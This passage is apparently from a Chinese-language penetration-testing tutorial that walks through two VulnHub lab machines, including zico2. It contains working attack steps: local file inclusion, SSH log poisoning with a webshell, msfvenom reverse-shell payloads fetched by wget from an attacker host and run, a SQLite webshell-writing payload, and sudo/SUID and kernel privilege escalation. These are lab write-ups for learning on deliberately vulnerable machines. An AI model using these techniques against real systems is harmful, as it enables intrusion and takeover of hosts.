点击 ABOUT US 链接后，发现URL为： http://192.168.1.101/?file=about.php ，存在任意文件包含的可能。
4. 文件包含漏洞测试
为了直观的看到测试结果，这里使用Burpsuite处理http请求。
通过尝试包含Linux系统的配置文件，发现存在一定的限制。
如：包含 /etc/passwd 发现没有结果。
之后测试了几个常见的Apache日志的路径：
/var/log/apache/access.log
/var/log/apache2/access.log
/var/www/logs/access.log
/var/log/access.log
均无结果。
猜测可能是更改了配置文件的路径，尝试读Apache2的配置文件， /etc/apache2/apache2.conf ，发现也是失败。
尝试通过php伪协议读取php文件源码，也无果。
file=php://filter/convert.base64-encode/resource=index.php
根据之前整理的文件包含漏洞笔记利用思路:
结合之前信息探测的结果，靶机只开通了 http 与 ssh 服务。Apache的日志包含失败，尝试包含ssh的登陆日志。
成功读到ssh的登陆日志。
获取shell
1. 获取一句话Webshell
使用一句话作为用户名登陆靶机的ssh。
ssh ''@192.168.1.101
SSH的日志会记录此次登陆行为，这样就可以把一句话写入ssh的日志文件。测试一下是否成功：
可以看到一句话已经成功写入。
2. msfvenom生成Meterpreter shell
平时使用Msf比较多，这里也以Msf作为接下来主要的渗透工具。
首先生成Linux平台的shell程序。
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=4444 -f elf > shell.elf
3. Metasploit 设置监听
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 192.168.1.102
exploit
4. 种植Meterpreter shell
首先使用Python搭建一个简单的Web Server： python -m SimpleHTTPServer 80
之后利用前面获得的一句话，执行命令，下载生成的木马，并且运行。
分别发送以下请求：
1. /?file=/var/log/auth.log&f=system('wget+192.168.1.102/shell.elf')%3b
2. /?file=/var/log/auth.log&f=system('chmod+%2bx+shell.elf')%3b
3. /?file=/var/log/auth.log&f=system('./shell.elf')%3b
注意:
1. 因为要执行的命令里面有空格、加号等符号，要将payload进行urlencode之后才可以正常执行。
2. 因为生成的木马文件没有执行权限，下载到靶机后也无法执行，所以需要先给 shell.elf 添加执行权限，之
后再执行。
执行结果：
Web Server及msf的结果：
提升权限
Linux提权的基本思路：
1. 溢出提权
现在拿到了目标靶机的Meterpreter shell，简单的看下信息。
发现系统为 Ubuntu 16.04 (Linux 4.10.0-40-generic) ，前段时间爆了Ubuntu16.04提权的exp，在这里试一试。
exp 地址：https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c
提权失败。
2. 使用msf提权
use post/multi/recon/local_exploit_suggester
没有发现可以利用的提权漏洞。
3. 错误的SUID文件提权
进入交互式shell，派生一个bash的shell： python -c 'import pty;pty.spawn("/bin/bash")'
在Web的目录中发现了 xxxlogauditorxxx.py ，这是不应该存在的，猜测是题目所指的特殊文件，而且该文件特别
大。
运行一下该py文件，发现是审计日志的程序。 查看Apache2的日志文件，发现是执行了 cat 命令，但是因为权限
不够，没有执行成功。
仔细查看py文件的权限，发现具有SUID的权限，且文件所属用户为root。
sudo --list 查看一下用户权限。
发现可以不使用密码即可以root权限运行该py文件。这就好办多了。
该py文件的配置错误，导致可以直接以root权限执行命令。
接下来拿root权限的shell。
4. 获取root权限的shell
因为之前已经上传了Msfvenom生成的马，这里再次使用。首先退出 shell ， background 命令调入后台，然后再
次开启监听，并且置于后台。
利用发现的特殊文件以root权限运行msf木马。
sudo ./xxxlogauditorxxx.py
/var/log/apache2/access.log|./shell.elf
运行py之后，显示出现问题，不过不影响运行木马。
进入session 2的shell，查看权限：
获取flag
在root的家目录发现了 flag.png 文件：
下载到本地进行分析：
推测接下来的考点属于图片隐写。
经过分析，在图片文件的末尾发现了一串base64
将base64写入 flag.txt ，进行解码后get flag：
cat flag | base64 -d
靶场思路回顾
至此，已经完成最终目标，回头分析一下之前几个失败的点。
1. Web方面利用失败原因
首先看一下index.php的核心代码：
可以看到 index.php 将一些关键词置空了。
所以，之前利用不成功的点原因如下：
伪协议读文件失败
过滤了 php: 且大小写敏感，故不能使用伪协议读文件。
读取配置文件、passwd文件等失败
过滤了 etc ，无法读取任何配置文件
读取Apache访问日志失败。
因权限问题， www-data 用户无法写入和读取Apache的日志文件。故，包含Apache日志失败。
2. 系统方面利用失败原因
溢出提权失败
通过分析报错，原因可能是因为靶机系统为32位，但exp只支持64位系统。
思路总结
突破点总结：
1. PHP本地文件包含漏洞发现
2. SSH日志写入一句话
3. 利用LFI和SSH日志getshell
4. MSF生成木马，利用一句话植入、运行
5. 利用错误配置SUID程序提权
在完成这次靶场的过程中，可以有很多发散的思路，比如：
1. 文件包含漏洞，可以使用字典Fuzz一下各种配置文件。
2. 使用NC或者其他反弹shell的姿势反弹shell。
此外，Metasploit Framework有很多方便实用的功能，如果能够掌握，会大大简化渗透的某些步骤，值得深入学
习。
总体来说，此靶场设计比较简单。一个Web，一个SSH，利用点无非这两个，思路比较清晰，便于实践者完成该靶
场。
第九节 zico2
靶机信息
下载链接
https://download.vulnhub.com/zico/zico2.ova
运行环境
本靶机提供了OVA格式的镜像，官方推荐使用virtualbox，从Vulnhub下载之后，导入到viirtualbox即可运
行。
靶机：修改靶机的网络配置为桥接模式。
攻击机：Kali虚拟机，同样使用桥接模式，即可访问靶机。
靶机说明
本靶机的难度为中等。
本靶机的渗透目标为渗透进靶机，拿到root权限，并读取flag文件。
官方提供了一个提示：枚举、枚举、枚举。
信息收集
ip发现
首先看一下Kali的网络配置。
之后使用nmap发现靶机。 nmap -sP 192.168.1.0/24 发现有本网段有四个相关IP。
端口扫描与服务识别
使用nmap快速扫描选项（ -F 参数）扫描 192.168.1.0/24 网段
根据 Mac 可以很明显的区分， 192.168.1.3 为运行在VirtualBox上的虚拟机，即我们构建的靶机。
确定目标IP之后，使用Nmap对目标进行更加详细的探测： nmap -A -v 192.168.1.3 -oN nmap.txt
解释一下相关参数：
-A 详细扫描目标IP，加载所有脚本，尽可能全面的探测信息；
-v 显示详细的扫描过程；
-oN 将扫描结果以普通文本的格式输出到 nmap.txt 。
结果如下：
威胁建模
分析nmap的扫描结果，发现靶机开放了 22 和 80 ， 111 端口，系统为 Linux 。 22 端口为 SSH 服务， 80
端口为 http 服务，Web容器为 Apache/2.2.22 。
通常Web会存在各种各样的问题，经过初步分析，以Web作为初步的渗透入口。
Web漏洞挖掘
1. 使用dirb扫描网站目录
dirb http://192.168.1.3
发现敏感目录 dbadmin
2. 目录遍历漏洞
访问 http://192.168.1.3/dbadmin/ ，发现目录遍历了，同时存在 test_db.php 文件。
3. 弱口令
访问 http://192.168.1.3/dbadmin/test_db.php ，发现是类似于MySQL的phpmyadmin，靶机的这个是sqlite的
网页版管理。
尝试弱口令 admin 即可进入。
4. phpLiteAdmin的信息收集
查看原有的数据库，发现里面存在两个账号，使用somd5.com 解密。
得到以下信息：
root 34kroot34
zico zico2215@
5. 文件包含漏洞
浏览网站功能，发现一个连接为：http://192.168.1.3/view.php?page=tools.html
猜测存在文件包含漏洞。经过尝试，可以成功包含Linux的passwd文件。
获取Webshell
1. 尝试通过新建数据库getshell
Sqlite数据库一般应用在很多嵌入式设备当中，属于单文件的数据库，类似于Access数据库。这里尝试新建一个名
为 shell.php 的数据库文件，对应的会生成shell.php的一个文件。但是观察到数据库文件的路径
在 /usr/databases/test_users
那么，尝试新建一个数据库名为 ../../var/www/html/shell.php 。
新建成功，但是发现过滤掉了 / 。此方法失败，但留作记录，算是一个突破点。
2. 尝试导出文件getshell
payload: ATTACH DATABASE '/var/www/html/shell.php' AS test ;create TABLE test.exp (dataz text) ;
insert INTO test.exp (dataz) VALUES ('');
通过这种方式写文件，适用于以下场景：
1. 可直接访问数据库执行SQL语句。
2. 堆叠查询选项启用（默认关闭）
执行失败，放弃这个点。
3. 利用phpliteadmin和文件包含漏洞getshell
经过前期的尝试，发现了文件包含漏洞和数据库权限。两者结合，即可getshell。方法如下：
1. 通过phpliteadmin新加一条数据，写入数据库文件。
2. 利用文件包含漏洞包含数据库文件getshell。
4. 种植Meterpreter shell
首先生成一个msf的可执行木马。
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f elf > ~/Desktop/msf.elf
之后使用Python搭建一个简单的Web Server： python -m SimpleHTTPServer 80
之后利用前面获得的一句话，执行命令，下载生成的木马，并且运行。
下载木马： x=system('wget http://192.168.1.4:9999/msf.elf');
之后 x=system('ls'); 发现并没有保存，推测是因为权限问题。那么，直接下载到 /tmp 目录
x=system('wget http://192.168.1.4:9999/msf.elf -O /tmp/msf.elf');
查看一下：
之后添加执行权限并且运行。
x=system('chmod +x /tmp/msf.elf');
x=system('/tmp/msf.elf');
结果如下：
提升权限
Linux提权的基本思路：
1. 使用msf提权
use post/multi/recon/local_exploit_suggester
没有发现可以利用的提权漏洞。
2. 溢出提权
现在拿到了目标靶机的Meterpreter shell，简单的看下信息。
发现系统为 Ubuntu 12.04 (Linux 3.2.0-23-generic) 。到 www.exploit-db.com 搜索对应的exp。
这里使用第二个EXP。地址为： https://www.exploit-db.com/exploits/33589/
使用方法：
首先使用Meterpreter的shell把C代码写入：
进入shell，使用Python spawn一个shell。 python -c 'import pty;pty.spawn("/bin/bash")' 。
之后编译执行exp。
获取flag
在root的家目录发现了 flag.txt 文件：
靶场思路回顾
至此，已经完成最终目标，回头分析一下之前几个失败的点。
1. 使用phpliteadmin写马失败原因
发现网站的根目录为 /var/www 而不是 /var/www/html ，其次 www 目录的权限问题，不能直接写shell。
但是 /var/www/ 下的其他目录，权限设置的非常大，可以直接写shell。
2.再次利用phpliteadmin写马尝试getshell
在以上基础上，我们知道了网站的绝对路径，且网站目录的其他文件夹权限设置有问题。
尝试写shell：
成功写入：
思路总结
突破点总结：